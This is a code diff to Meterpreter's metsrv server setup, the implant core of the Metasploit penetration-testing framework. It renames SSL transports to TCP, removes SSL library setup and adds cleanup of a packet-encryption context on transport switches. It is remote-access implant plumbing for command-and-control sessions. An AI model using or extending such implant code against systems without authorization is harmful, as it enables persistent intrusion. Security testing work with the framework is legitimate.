@@ -7,7 +7,7 @@
 
 #include "win/server_transport_winhttp.h"
 #include "win/server_transport_tcp.h"
-#include "ssl_lib_setup.h"
+#include "../../common/packet_encryption.h"
 
 #define TRANSPORT_ID_OFFSET 22
 
@@ -246,9 +246,9 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	do
 	{
 		// extend memory appropriately
-		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
+		DWORD neededSize = t->type == METERPRETER_TRANSPORT_TCP ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
 
-		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : "http/s", s);
+		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_TCP ? "TCP" : "HTTP/S", s);
 
 		sess = (MetsrvSession*)realloc(sess, s + neededSize);
 
@@ -258,7 +258,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 		ZeroMemory(target, neededSize);
 		s += neededSize;
 
-		if (t->type == METERPRETER_TRANSPORT_SSL)
+		if (t->type == METERPRETER_TRANSPORT_TCP)
 		{
 			transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
 			dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
@@ -348,8 +348,6 @@ DWORD server_setup(MetsrvConfig* config)
 				break;
 			}
 
-			setup_ssl_lib(&remote->ssl);
-
 			remote->orig_config = config;
 			remote->sess_expiry_time = config->session.expiry;
 			remote->sess_start_time = current_unix_timestamp();
@@ -367,7 +365,7 @@ DWORD server_setup(MetsrvConfig* config)
 
 			// the first transport should match the transport that we initially connected on.
 			// If it's TCP comms, we need to wire that up.
-			if (remote->transport->type == METERPRETER_TRANSPORT_SSL && config->session.comms_fd)
+			if (remote->transport->type == METERPRETER_TRANSPORT_TCP && config->session.comms_fd)
 			{
 				((TcpTransportContext*)remote->transport->ctx)->fd = (SOCKET)config->session.comms_fd;
 			}
@@ -467,7 +465,6 @@ DWORD server_setup(MetsrvConfig* config)
 					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->next_transport);
 					remote->transport = remote->next_transport;
 					remote->next_transport = NULL;
-
 				}
 				else
 				{
@@ -486,6 +483,9 @@ DWORD server_setup(MetsrvConfig* config)
 					// the wait is a once-off thing, needs to be reset each time
 					remote->next_transport_wait = 0;
 				}
+
+				// if we had an encryption context we should clear it up.
+				free_encryption_context(remote);
 			}
 
 			// clean up the transports
